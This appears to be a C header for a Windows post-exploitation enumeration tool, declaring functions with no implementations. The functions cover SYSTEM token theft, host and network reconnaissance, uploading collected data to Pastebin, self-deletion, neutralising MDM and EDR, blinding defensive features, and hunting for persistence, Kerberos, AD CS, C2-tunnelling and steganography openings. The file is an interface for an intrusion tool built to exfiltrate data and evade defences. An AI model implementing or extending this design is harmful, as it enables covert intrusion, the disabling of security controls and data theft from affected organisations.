#ifndef ENUMERATOR_H
#define ENUMERATOR_H

#include <windows.h>
#include <stdbool.h>
#include <stdint.h>

// Buffer sizes
#define MAX_BUFFER_SIZE (10 * 1024 * 1024)  // 10MB buffer
#define MAX_STRING_LEN 4096
#define MAX_PATH_LEN 260

// Token acquisition result
typedef struct {
    bool success;
    HANDLE token_handle;
    char method[256];
    char user_sid[256];
    char error_details[1024];
    DWORD error_code;
    bool is_elevated;
    char privileges[2048];
    char groups[2048];
} token_result_t;

// Progress callback
typedef void (*progress_callback_t)(int percentage, const char* operation);

// Enumeration data structure
typedef struct {
    char* buffer;
    size_t buffer_size;
    size_t buffer_used;
    token_result_t token_result;
    bool has_system_token;
} enum_data_t;

// Function prototypes
bool acquire_system_token(token_result_t* result);
void log_token_result(enum_data_t* data, const token_result_t* result);
int enumerate_system(enum_data_t* data, progress_callback_t progress);
int enumerate_network(enum_data_t* data, progress_callback_t progress);
int enumerate_vlan(enum_data_t* data, progress_callback_t progress);
int upload_to_pastebin(const char* data, size_t data_len, char* url_out, size_t url_len);
void self_delete(void);

// Utility functions
void append_to_buffer(enum_data_t* data, const char* format, ...);
void init_enum_data(enum_data_t* data);
void free_enum_data(enum_data_t* data);

// MDM and EDR evasion functions
int detect_and_neutralize_mdm(enum_data_t* data);

// Defensive feature blinding functions
int blind_defensive_features(enum_data_t* data);

// Phase 1: Enhanced Enumeration Functions
// 1.1 Post-Exploitation Indicators (WINCLOAK patterns)
int enumerate_post_exploitation_indicators(enum_data_t* data);
int detect_amsi_etw_wfp(enum_data_t* data);
int enumerate_com_hijacking_opportunities(enum_data_t* data);
int check_wmi_persistence(enum_data_t* data);
int enumerate_kerberos_opportunities(enum_data_t* data);
int detect_rootkit_indicators(enum_data_t* data);

// 1.2 Active Directory & Certificate Services (ACTIVEGAME patterns)
int enumerate_ad_infrastructure(enum_data_t* data);
int enumerate_certificate_services(enum_data_t* data);
int check_certificate_template_vulnerabilities(enum_data_t* data);
int detect_adcs_misconfigurations(enum_data_t* data);

// 1.3 WAF/Web Application Indicators (CORTISOL patterns)
int detect_waf_presence(enum_data_t* data);
int enumerate_web_application_tech(enum_data_t* data);
int check_normalization_bypass_opportunities(enum_data_t* data);

// 1.4 C2 Infrastructure Opportunities (ROCKHAMMER patterns)
int enumerate_c2_opportunities(enum_data_t* data);
int check_tunnel_proxy_opportunities(enum_data_t* data);
int detect_dns_tunneling_opportunities(enum_data_t* data);

// 1.5 Steganography Opportunities (SLEEPYMONEY patterns)
int enumerate_steganography_opportunities(enum_data_t* data);
int analyze_file_entropy(enum_data_t* data, const char* filepath);

#endif // ENUMERATOR_H
